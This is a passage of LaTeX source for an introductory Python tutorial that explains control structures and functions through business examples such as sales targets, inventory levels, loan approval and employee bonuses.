    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"}\SpecialCharTok{\{}\NormalTok{quarter}\SpecialCharTok{\}}\SpecialStringTok{ sales: $}\SpecialCharTok{\{}\NormalTok{sales}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsubsection{While Loops}\label{while-loops}

While loops are used to execute a block of code as long as a specified
condition is true.

\paragraph{Example: Track Inventory
Levels}\label{example-track-inventory-levels}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{inventory }\OperatorTok{=} \DecValTok{100}

\ControlFlowTok{while}\NormalTok{ inventory }\OperatorTok{\textgreater{}} \DecValTok{0}\NormalTok{:}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Inventory level: }\SpecialCharTok{\{}\NormalTok{inventory}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\NormalTok{    inventory }\OperatorTok{{-}=} \DecValTok{10}  \CommentTok{\# Selling 10 units}

\BuiltInTok{print}\NormalTok{(}\StringTok{"Inventory depleted"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\paragraph{Example: Customer Payment
Processing}\label{example-customer-payment-processing}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{balance\_due }\OperatorTok{=} \DecValTok{500}

\ControlFlowTok{while}\NormalTok{ balance\_due }\OperatorTok{\textgreater{}} \DecValTok{0}\NormalTok{:}
\NormalTok{    payment }\OperatorTok{=} \BuiltInTok{float}\NormalTok{(}\BuiltInTok{input}\NormalTok{(}\StringTok{"Enter payment amount: $"}\NormalTok{))}
\NormalTok{    balance\_due }\OperatorTok{{-}=}\NormalTok{ payment}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Remaining balance: $}\SpecialCharTok{\{}\NormalTok{balance\_due}\SpecialCharTok{:.2f\}}\SpecialStringTok{"}\NormalTok{)}

\BuiltInTok{print}\NormalTok{(}\StringTok{"Payment complete"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Nested Control Structures}\label{nested-control-structures}

You can nest control structures within each other to handle more complex
logic.

\paragraph{Example: Approve Loan
Application}\label{example-approve-loan-application}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{credit\_score }\OperatorTok{=} \DecValTok{720}
\NormalTok{annual\_income }\OperatorTok{=} \DecValTok{50000}
\NormalTok{loan\_amount }\OperatorTok{=} \DecValTok{20000}

\ControlFlowTok{if}\NormalTok{ credit\_score }\OperatorTok{\textgreater{}=} \DecValTok{700}\NormalTok{:}
    \ControlFlowTok{if}\NormalTok{ annual\_income }\OperatorTok{\textgreater{}=} \DecValTok{40000}\NormalTok{:}
        \ControlFlowTok{if}\NormalTok{ loan\_amount }\OperatorTok{\textless{}=} \DecValTok{25000}\NormalTok{:}
\NormalTok{            loan\_approved }\OperatorTok{=} \VariableTok{True}
        \ControlFlowTok{else}\NormalTok{:}
\NormalTok{            loan\_approved }\OperatorTok{=} \VariableTok{False}
    \ControlFlowTok{else}\NormalTok{:}
\NormalTok{        loan\_approved }\OperatorTok{=} \VariableTok{False}
\ControlFlowTok{else}\NormalTok{:}
\NormalTok{    loan\_approved }\OperatorTok{=} \VariableTok{False}

\ControlFlowTok{if}\NormalTok{ loan\_approved:}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"Loan application approved"}\NormalTok{)}
\ControlFlowTok{else}\NormalTok{:}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"Loan application denied"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Conclusion}\label{conclusion-2}

Control structures are essential for managing the flow of your programs
based on conditions and repetitions. By using if statements, for loops,
and while loops, you can create efficient and effective business
applications. These examples demonstrate how to apply these concepts to
common business scenarios, helping you to develop practical and
functional Python programs.

\bookmarksetup{startatroot}

\chapter{Deep Dive Tutorial into Python Control Structures with Business
Analytics and Information Systems
Examples}\label{deep-dive-tutorial-into-python-control-structures-with-business-analytics-and-information-systems-examples}

Control structures in Python allow you to control the flow of execution
based on certain conditions or repetitive tasks. These structures
include conditional statements, loops, and control flow tools like
break, continue, and pass statements. Understanding these structures is
crucial for writing efficient and effective Python programs. This
tutorial provides a comprehensive overview of Python control structures
with practical examples in business analytics and information systems
(BAIS).

\section{Table of Contents}\label{table-of-contents-1}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \hyperref[conditional-statements]{Conditional Statements}

  \begin{itemize}
  \tightlist
  \item
    \hyperref[if-statement]{if Statement}
  \item
    \hyperref[else-statement]{else Statement}
  \item
    \hyperref[elif-statement]{elif Statement}
  \end{itemize}
\item
  \hyperref[loops]{Loops}

  \begin{itemize}
  \tightlist
  \item
    \hyperref[for-loop]{for Loop}
  \item
    \hyperref[while-loop]{while Loop}
  \item
    \hyperref[nested-loops]{Nested Loops}
  \end{itemize}
\item
  \hyperref[control-flow-tools]{Control Flow Tools}

  \begin{itemize}
  \tightlist
  \item
    \hyperref[break-statement]{break Statement}
  \item
    \hyperref[continue-statement]{continue Statement}
  \item
    \hyperref[pass-statement]{pass Statement}
  \item
    \hyperref[else-clause-in-loops]{else Clause in Loops}
  \end{itemize}
\item
  \hyperref[list-comprehensions]{List Comprehensions}
\item
  \hyperref[exception-handling]{Exception Handling}
\item
  \hyperref[conclusion]{Conclusion}
\end{enumerate}

\section{Conditional Statements}\label{conditional-statements-3}

Conditional statements allow you to execute certain blocks of code based
on specific conditions. Python provides \texttt{if}, \texttt{elif}, and
\texttt{else} statements to handle conditional execution.

\subsection{if Statement}\label{if-statement}

The \texttt{if} statement is used to test a condition. If the condition
evaluates to \texttt{True}, the block of code inside the \texttt{if}
statement is executed.

\textbf{Example: Analyzing Sales Data}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Example: Check if sales exceed a target}
\NormalTok{sales }\OperatorTok{=} \DecValTok{12000}
\NormalTok{target }\OperatorTok{=} \DecValTok{10000}
\ControlFlowTok{if}\NormalTok{ sales }\OperatorTok{\textgreater{}}\NormalTok{ target:}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"Sales target exceeded"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{else Statement}\label{else-statement}

The \texttt{else} statement follows an \texttt{if} statement and is
executed if the \texttt{if} condition evaluates to \texttt{False}.

\textbf{Example: Analyzing Sales Data}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Example: Check if sales exceed a target}
\NormalTok{sales }\OperatorTok{=} \DecValTok{8000}
\NormalTok{target }\OperatorTok{=} \DecValTok{10000}
\ControlFlowTok{if}\NormalTok{ sales }\OperatorTok{\textgreater{}}\NormalTok{ target:}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"Sales target exceeded"}\NormalTok{)}
\ControlFlowTok{else}\NormalTok{:}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"Sales target not met"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{elif Statement}\label{elif-statement}

The \texttt{elif} statement stands for ``else if'' and allows you to
check multiple conditions. If the \texttt{if} condition is
\texttt{False}, the \texttt{elif} condition is checked. If it is
\texttt{True}, the corresponding block of code is executed.

\textbf{Example: Categorizing Sales Performance}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Example: Categorizing sales performance}
\NormalTok{sales }\OperatorTok{=} \DecValTok{10000}
\NormalTok{target }\OperatorTok{=} \DecValTok{10000}
\ControlFlowTok{if}\NormalTok{ sales }\OperatorTok{\textgreater{}}\NormalTok{ target:}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"Sales target exceeded"}\NormalTok{)}
\ControlFlowTok{elif}\NormalTok{ sales }\OperatorTok{==}\NormalTok{ target:}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"Sales target met exactly"}\NormalTok{)}
\ControlFlowTok{else}\NormalTok{:}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"Sales target not met"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Nested If Statements}\label{nested-if-statements}

You can nest \texttt{if}, \texttt{elif}, and \texttt{else} statements to
create complex conditional logic.

\textbf{Example: Advanced Sales Analysis}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Example: Advanced sales analysis}
\NormalTok{sales }\OperatorTok{=} \DecValTok{15000}
\NormalTok{target }\OperatorTok{=} \DecValTok{10000}
\NormalTok{region }\OperatorTok{=} \StringTok{"North"}

\ControlFlowTok{if}\NormalTok{ sales }\OperatorTok{\textgreater{}}\NormalTok{ target:}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"Sales target exceeded"}\NormalTok{)}
    \ControlFlowTok{if}\NormalTok{ region }\OperatorTok{==} \StringTok{"North"}\NormalTok{:}
        \BuiltInTok{print}\NormalTok{(}\StringTok{"Great performance in the North region!"}\NormalTok{)}
    \ControlFlowTok{else}\NormalTok{:}
        \BuiltInTok{print}\NormalTok{(}\StringTok{"Consider boosting sales in other regions."}\NormalTok{)}
\ControlFlowTok{else}\NormalTok{:}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"Sales target not met"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\section{Loops}\label{loops-3}

Loops are used to execute a block of code repeatedly. Python provides
\texttt{for} and \texttt{while} loops to handle iterative execution.

\subsection{for Loop}\label{for-loop-2}

The \texttt{for} loop is used to iterate over a sequence (e.g., list,
tuple, dictionary, set, or string).

\textbf{Example: Analyzing Multiple Sales Records}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Example: Analyzing multiple sales records}
\NormalTok{sales\_records }\OperatorTok{=}\NormalTok{ [}\DecValTok{12000}\NormalTok{, }\DecValTok{8000}\NormalTok{, }\DecValTok{15000}\NormalTok{, }\DecValTok{9000}\NormalTok{, }\DecValTok{13000}\NormalTok{]}
\ControlFlowTok{for}\NormalTok{ sales }\KeywordTok{in}\NormalTok{ sales\_records:}
    \ControlFlowTok{if}\NormalTok{ sales }\OperatorTok{\textgreater{}} \DecValTok{10000}\NormalTok{:}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Sales target exceeded with }\SpecialCharTok{\{}\NormalTok{sales}\SpecialCharTok{\}}\SpecialStringTok{ in sales"}\NormalTok{)}
    \ControlFlowTok{else}\NormalTok{:}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Sales target not met with }\SpecialCharTok{\{}\NormalTok{sales}\SpecialCharTok{\}}\SpecialStringTok{ in sales"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

The \texttt{range()} function is often used with the \texttt{for} loop
to generate a sequence of numbers.

\textbf{Example: Monthly Sales Analysis}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Example: Monthly sales analysis}
\ControlFlowTok{for}\NormalTok{ month }\KeywordTok{in} \BuiltInTok{range}\NormalTok{(}\DecValTok{1}\NormalTok{, }\DecValTok{13}\NormalTok{):}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Analyzing sales data for month }\SpecialCharTok{\{}\NormalTok{month}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{while Loop}\label{while-loop-2}

The \texttt{while} loop is used to execute a block of code as long as
the condition is \texttt{True}.

\textbf{Example: Simulating Sales Until Target Met}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Example: Simulating sales until target met}
\NormalTok{sales }\OperatorTok{=} \DecValTok{0}
\NormalTok{target }\OperatorTok{=} \DecValTok{50000}
\NormalTok{increment }\OperatorTok{=} \DecValTok{10000}
\ControlFlowTok{while}\NormalTok{ sales }\OperatorTok{\textless{}}\NormalTok{ target:}
\NormalTok{    sales }\OperatorTok{+=}\NormalTok{ increment}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Current sales: }\SpecialCharTok{\{}\NormalTok{sales}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Nested Loops}\label{nested-loops}

You can nest loops to perform more complex iterative tasks.

\textbf{Example: Comparing Sales Across Regions and Months}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Example: Comparing sales across regions and months}
\NormalTok{regions }\OperatorTok{=}\NormalTok{ [}\StringTok{"North"}\NormalTok{, }\StringTok{"South"}\NormalTok{, }\StringTok{"East"}\NormalTok{, }\StringTok{"West"}\NormalTok{]}
\NormalTok{months }\OperatorTok{=}\NormalTok{ [}\StringTok{"January"}\NormalTok{, }\StringTok{"February"}\NormalTok{, }\StringTok{"March"}\NormalTok{]}

\ControlFlowTok{for}\NormalTok{ region }\KeywordTok{in}\NormalTok{ regions:}
    \ControlFlowTok{for}\NormalTok{ month }\KeywordTok{in}\NormalTok{ months:}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Analyzing sales data for }\SpecialCharTok{\{}\NormalTok{region}\SpecialCharTok{\}}\SpecialStringTok{ region in }\SpecialCharTok{\{}\NormalTok{month}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\section{Control Flow Tools}\label{control-flow-tools}

Control flow tools like \texttt{break}, \texttt{continue}, and
\texttt{pass} provide additional control over the execution of loops and
conditional statements.

\subsection{break Statement}\label{break-statement}

The \texttt{break} statement is used to exit a loop prematurely.

\textbf{Example: Stop Analysis When Target Achieved}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Example: Stop analysis when target achieved}
\NormalTok{sales\_records }\OperatorTok{=}\NormalTok{ [}\DecValTok{8000}\NormalTok{, }\DecValTok{9000}\NormalTok{, }\DecValTok{15000}\NormalTok{, }\DecValTok{7000}\NormalTok{, }\DecValTok{12000}\NormalTok{]}
\ControlFlowTok{for}\NormalTok{ sales }\KeywordTok{in}\NormalTok{ sales\_records:}
    \ControlFlowTok{if}\NormalTok{ sales }\OperatorTok{\textgreater{}} \DecValTok{10000}\NormalTok{:}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Sales target exceeded with }\SpecialCharTok{\{}\NormalTok{sales}\SpecialCharTok{\}}\SpecialStringTok{ in sales"}\NormalTok{)}
        \ControlFlowTok{break}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Sales target not met with }\SpecialCharTok{\{}\NormalTok{sales}\SpecialCharTok{\}}\SpecialStringTok{ in sales"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{continue Statement}\label{continue-statement}

The \texttt{continue} statement is used to skip the rest of the code
inside the loop for the current iteration and move to the next
iteration.

\textbf{Example: Skip Underperforming Sales Data}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Example: Skip underperforming sales data}
\NormalTok{sales\_records }\OperatorTok{=}\NormalTok{ [}\DecValTok{8000}\NormalTok{, }\DecValTok{9000}\NormalTok{, }\DecValTok{15000}\NormalTok{, }\DecValTok{7000}\NormalTok{, }\DecValTok{12000}\NormalTok{]}
\ControlFlowTok{for}\NormalTok{ sales }\KeywordTok{in}\NormalTok{ sales\_records:}
    \ControlFlowTok{if}\NormalTok{ sales }\OperatorTok{\textless{}} \DecValTok{10000}\NormalTok{:}
        \ControlFlowTok{continue}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Sales target exceeded with }\SpecialCharTok{\{}\NormalTok{sales}\SpecialCharTok{\}}\SpecialStringTok{ in sales"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{pass Statement}\label{pass-statement}

The \texttt{pass} statement is a null operation; nothing happens when it
executes. It can be used as a placeholder.

\textbf{Example: Placeholder for Future Code}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Example: Placeholder for future code}
\ControlFlowTok{for}\NormalTok{ sales }\KeywordTok{in}\NormalTok{ sales\_records:}
    \ControlFlowTok{if}\NormalTok{ sales }\OperatorTok{\textless{}} \DecValTok{10000}\NormalTok{:}
        \ControlFlowTok{pass}  \CommentTok{\# }\AlertTok{TODO}\CommentTok{: Handle underperforming sales data later}
    \ControlFlowTok{else}\NormalTok{:}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Sales target exceeded with }\SpecialCharTok{\{}\NormalTok{sales}\SpecialCharTok{\}}\SpecialStringTok{ in sales"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{else Clause in Loops}\label{else-clause-in-loops}

The \texttt{else} clause can be used with loops. It is executed when the
loop terminates naturally (i.e., not terminated by a \texttt{break}
statement).

\textbf{Example: Verify All Sales Records Analyzed}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Example: Verify all sales records analyzed}
\NormalTok{sales\_records }\OperatorTok{=}\NormalTok{ [}\DecValTok{8000}\NormalTok{, }\DecValTok{9000}\NormalTok{, }\DecValTok{15000}\NormalTok{, }\DecValTok{7000}\NormalTok{, }\DecValTok{12000}\NormalTok{]}
\ControlFlowTok{for}\NormalTok{ sales }\KeywordTok{in}\NormalTok{ sales\_records:}
    \ControlFlowTok{if}\NormalTok{ sales }\OperatorTok{\textgreater{}} \DecValTok{10000}\NormalTok{:}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Sales target exceeded with }\SpecialCharTok{\{}\NormalTok{sales}\SpecialCharTok{\}}\SpecialStringTok{ in sales"}\NormalTok{)}
\ControlFlowTok{else}\NormalTok{:}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"All sales records analyzed"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\section{List Comprehensions}\label{list-comprehensions}

List comprehensions provide a concise way to create lists. They consist
of brackets containing an expression followed by a \texttt{for} clause
and can have optional \texttt{if} clauses.

\textbf{Example: Filter Sales Data}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Example: Filter sales data}
\NormalTok{sales\_records }\OperatorTok{=}\NormalTok{ [}\DecValTok{8000}\NormalTok{, }\DecValTok{9000}\NormalTok{, }\DecValTok{15000}\NormalTok{, }\DecValTok{7000}\NormalTok{, }\DecValTok{12000}\NormalTok{]}
\NormalTok{high\_sales }\OperatorTok{=}\NormalTok{ [sales }\ControlFlowTok{for}\NormalTok{ sales }\KeywordTok{in}\NormalTok{ sales\_records }\ControlFlowTok{if}\NormalTok{ sales }\OperatorTok{\textgreater{}} \DecValTok{10000}\NormalTok{]}
\BuiltInTok{print}\NormalTok{(high\_sales)}
\end{Highlighting}
\end{Shaded}

\section{Exception Handling}\label{exception-handling-1}

Exception handling allows you to handle runtime errors gracefully. The
\texttt{try} block lets you test a block of code for errors, the
\texttt{except} block lets you handle the error, and the
\texttt{finally} block lets you execute code regardless of the result.

\textbf{Example: Handle Division by Zero in Financial Calculations}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Example: Handle division by zero in financial calculations}
\ControlFlowTok{try}\NormalTok{:}
\NormalTok{    revenue }\OperatorTok{=} \DecValTok{100000}
\NormalTok{    expenses }\OperatorTok{=} \DecValTok{0}
\NormalTok{    profit\_margin }\OperatorTok{=}\NormalTok{ revenue }\OperatorTok{/}\NormalTok{ expenses}
\ControlFlowTok{except} \PreprocessorTok{ZeroDivisionError}\NormalTok{:}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"Expenses cannot be zero when calculating profit margin"}\NormalTok{)}
\ControlFlowTok{finally}\NormalTok{:}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"Financial calculation completed"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\section{Conclusion}\label{conclusion-3}

This deep dive tutorial covered the fundamentals of Python control
structures, including conditional statements, loops, control flow tools,
list comprehensions, and exception handling, with examples tailored to
business analytics and information systems (BAIS). By mastering these
concepts, you can write more efficient and readable Python code, handle
complex logic, and manage errors effectively. Understanding and
utilizing control structures is essential for any Python programmer, as
they form the backbone of decision-making and iterative processes in
your programs.

\bookmarksetup{startatroot}

\chapter{Introduction to Python
Functions}\label{introduction-to-python-functions}

Functions are reusable blocks of code that perform a specific task in a
program. Using functions makes your code more organized, modular, and
easier to manage. This tutorial will introduce you to Python functions
with a focus on business-related examples.

\subsection{Defining and Calling
Functions}\label{defining-and-calling-functions-1}

A function in Python is defined using the \texttt{def} keyword, followed
by the function name, parentheses, and a colon. The code block within
every function starts with an indentation.

\subsubsection{Basic Function}\label{basic-function}

\paragraph{Example: Calculate Total
Sales}\label{example-calculate-total-sales}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ calculate\_total\_sales(unit\_price, quantity):}
\NormalTok{    total\_sales }\OperatorTok{=}\NormalTok{ unit\_price }\OperatorTok{*}\NormalTok{ quantity}
    \ControlFlowTok{return}\NormalTok{ total\_sales}

\CommentTok{\# Calling the function}
\NormalTok{unit\_price }\OperatorTok{=} \DecValTok{50}
\NormalTok{quantity }\OperatorTok{=} \DecValTok{100}
\NormalTok{total\_sales }\OperatorTok{=}\NormalTok{ calculate\_total\_sales(unit\_price, quantity)}
\BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Total sales: $}\SpecialCharTok{\{}\NormalTok{total\_sales}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Function Parameters and
Arguments}\label{function-parameters-and-arguments}

Functions can accept parameters, which are values passed to the function
when it is called.

\subsubsection{Positional Arguments}\label{positional-arguments}

Positional arguments are the most common way to pass data to functions.

\paragraph{Example: Calculate Discounted
Price}\label{example-calculate-discounted-price}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ calculate\_discounted\_price(price, discount):}
\NormalTok{    discounted\_price }\OperatorTok{=}\NormalTok{ price }\OperatorTok{*}\NormalTok{ (}\DecValTok{1} \OperatorTok{{-}}\NormalTok{ discount)}
    \ControlFlowTok{return}\NormalTok{ discounted\_price}

\CommentTok{\# Calling the function}
\NormalTok{price }\OperatorTok{=} \DecValTok{200}
\NormalTok{discount }\OperatorTok{=} \FloatTok{0.1}  \CommentTok{\# 10\% discount}
\NormalTok{discounted\_price }\OperatorTok{=}\NormalTok{ calculate\_discounted\_price(price, discount)}
\BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Discounted price: $}\SpecialCharTok{\{}\NormalTok{discounted\_price}\SpecialCharTok{:.2f\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsubsection{Keyword Arguments}\label{keyword-arguments}

Keyword arguments are passed to the function with their parameter names.

\paragraph{Example: Calculate Employee
Bonus}\label{example-calculate-employee-bonus}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ calculate\_bonus(salary, performance\_rating):}
    \ControlFlowTok{if}\NormalTok{ performance\_rating }\OperatorTok{\textgreater{}=} \FloatTok{4.5}\NormalTok{:}
\NormalTok{        bonus }\OperatorTok{=}\NormalTok{ salary }\OperatorTok{*} \FloatTok{0.2}  \CommentTok{\# 20\% bonus}
    \ControlFlowTok{elif}\NormalTok{ performance\_rating }\OperatorTok{\textgreater{}=} \FloatTok{3.5}\NormalTok{:}
\NormalTok{        bonus }\OperatorTok{=}\NormalTok{ salary }\OperatorTok{*} \FloatTok{0.1}  \CommentTok{\# 10\% bonus}
    \ControlFlowTok{else}\NormalTok{:}
\NormalTok{        bonus }\OperatorTok{=}\NormalTok{ salary }\OperatorTok{*} \FloatTok{0.05}  \CommentTok{\# 5\% bonus}
    \ControlFlowTok{return}\NormalTok{ bonus}

\CommentTok{\# Calling the function with keyword arguments}
\NormalTok{bonus }\OperatorTok{=}\NormalTok{ calculate\_bonus(salary}\OperatorTok{=}\DecValTok{50000}\NormalTok{, performance\_rating}\OperatorTok{=}\FloatTok{4.7}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Bonus: $}\SpecialCharTok{\{}\NormalTok{bonus}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Default Parameters}\label{default-parameters}

Default parameters are used when the function is called without
arguments.

\paragraph{Example: Calculate Monthly
Salary}\label{example-calculate-monthly-salary}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ calculate\_monthly\_salary(annual\_salary, months}\OperatorTok{=}\DecValTok{12}\NormalTok{):}
\NormalTok{    monthly\_salary }\OperatorTok{=}\NormalTok{ annual\_salary }\OperatorTok{/}\NormalTok{ months}
    \ControlFlowTok{return}\NormalTok{ monthly\_salary}

\CommentTok{\# Calling the function with and without the default parameter}
\NormalTok{annual\_salary }\OperatorTok{=} \DecValTok{60000}
\NormalTok{monthly\_salary }\OperatorTok{=}\NormalTok{ calculate\_monthly\_salary(annual\_salary)}
\BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Monthly salary: $}\SpecialCharTok{\{}\NormalTok{monthly\_salary}\SpecialCharTok{:.2f\}}\SpecialStringTok{"}\NormalTok{)}

\NormalTok{monthly\_salary\_10\_months }\OperatorTok{=}\NormalTok{ calculate\_monthly\_salary(annual\_salary, months}\OperatorTok{=}\DecValTok{10}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Monthly salary (10 months): $}\SpecialCharTok{\{}\NormalTok{monthly\_salary\_10\_months}\SpecialCharTok{:.2f\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Variable-Length Arguments}\label{variable-length-arguments}

Functions can accept an arbitrary number of arguments using
\texttt{*args} for positional arguments and \texttt{**kwargs} for
keyword arguments.

\subsubsection{Positional Variable-Length
Arguments}\label{positional-variable-length-arguments}

\paragraph{Example: Calculate Total
Revenue}\label{example-calculate-total-revenue}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ calculate\_total\_revenue(}\OperatorTok{*}\NormalTok{revenues):}
\NormalTok{    total\_revenue }\OperatorTok{=} \BuiltInTok{sum}\NormalTok{(revenues)}
    \ControlFlowTok{return}\NormalTok{ total\_revenue}

\CommentTok{\# Calling the function with multiple arguments}
\NormalTok{total\_revenue }\OperatorTok{=}\NormalTok{ calculate\_total\_revenue(}\DecValTok{1000}\NormalTok{, }\DecValTok{2000}\NormalTok{, }\DecValTok{3000}\NormalTok{, }\DecValTok{4000}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Total revenue: $}\SpecialCharTok{\{}\NormalTok{total\_revenue}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsubsection{Keyword Variable-Length
Arguments}\label{keyword-variable-length-arguments}

\paragraph{Example: Create Employee
Profile}\label{example-create-employee-profile}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ create\_employee\_profile(}\OperatorTok{**}\NormalTok{employee\_details):}
\NormalTok{    profile }\OperatorTok{=} \StringTok{""}
    \ControlFlowTok{for}\NormalTok{ key, value }\KeywordTok{in}\NormalTok{ employee\_details.items():}
\NormalTok{        profile }\OperatorTok{+=} \SpecialStringTok{f"}\SpecialCharTok{\{}\NormalTok{key}\SpecialCharTok{\}}\SpecialStringTok{: }\SpecialCharTok{\{}\NormalTok{value}\SpecialCharTok{\}}\CharTok{\textbackslash{}n}\SpecialStringTok{"}
    \ControlFlowTok{return}\NormalTok{ profile}

\CommentTok{\# Calling the function with multiple keyword arguments}
\NormalTok{employee\_profile }\OperatorTok{=}\NormalTok{ create\_employee\_profile(name}\OperatorTok{=}\StringTok{"John Doe"}\NormalTok{, age}\OperatorTok{=}\DecValTok{30}\NormalTok{, position}\OperatorTok{=}\StringTok{"Data Analyst"}\NormalTok{, salary}\OperatorTok{=}\DecValTok{70000}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\StringTok{"Employee Profile:"}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(employee\_profile)}
\end{Highlighting}
\end{Shaded}

\subsection{Returning Values}\label{returning-values}

Functions can return multiple values using tuples.

\paragraph{Example: Calculate
Statistics}\label{example-calculate-statistics}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ calculate\_statistics(sales):}
\NormalTok{    total\_sales }\OperatorTok{=} \BuiltInTok{sum}\NormalTok{(sales)}
\NormalTok{    average\_sales }\OperatorTok{=}\NormalTok{ total\_sales }\OperatorTok{/} \BuiltInTok{len}\NormalTok{(sales)}
\NormalTok{    max\_sales }\OperatorTok{=} \BuiltInTok{max}\NormalTok{(sales)}
\NormalTok{    min\_sales }\OperatorTok{=} \BuiltInTok{min}\NormalTok{(sales)}
    \ControlFlowTok{return}\NormalTok{ total\_sales, average\_sales, max\_sales, min\_sales}

\CommentTok{\# Calling the function}
\NormalTok{sales }\OperatorTok{=}\NormalTok{ [}\DecValTok{2000}\NormalTok{, }\DecValTok{3000}\NormalTok{, }\DecValTok{4000}\NormalTok{, }\DecValTok{5000}\NormalTok{, }\DecValTok{6000}\NormalTok{]}
\NormalTok{total, average, highest, lowest }\OperatorTok{=}\NormalTok{ calculate\_statistics(sales)}
\BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Total: $}\SpecialCharTok{\{}\NormalTok{total}\SpecialCharTok{\}}\SpecialStringTok{, Average: $}\SpecialCharTok{\{}\NormalTok{average}\SpecialCharTok{\}}\SpecialStringTok{, Highest: $}\SpecialCharTok{\{}\NormalTok{highest}\SpecialCharTok{\}}\SpecialStringTok{, Lowest: $}\SpecialCharTok{\{}\NormalTok{lowest}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Lambda Functions}\label{lambda-functions}

Lambda functions are small anonymous functions defined using the
\texttt{lambda} keyword.

\paragraph{Example: Calculate Tax}\label{example-calculate-tax}

\begin{Shaded}
\begin{Highlighting}[]
